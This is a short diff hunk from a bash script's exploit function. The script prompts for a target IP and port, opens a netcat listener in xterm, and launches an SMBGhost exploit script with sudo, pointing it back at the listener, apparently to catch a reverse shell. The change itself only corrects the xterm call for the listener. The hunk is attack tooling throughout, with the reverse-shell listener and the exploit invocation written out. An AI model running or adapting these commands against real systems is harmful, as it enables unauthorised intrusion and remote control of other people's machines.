@@ -26,7 +26,7 @@ exploit(){
     read PORT
     echo -e "${W}Please enter the target IP${NC}"
     read TARGET
-    xterm nc -lvp 8888 &
+    xterm -e nc -lvp 8888 &
     xterm -e sudo python3 /opt/SMBGhost_Exploit/Smb_Ghost.py -i ${TARGET} -e --lhost ${LISTENER} --lport 8888
 }
 
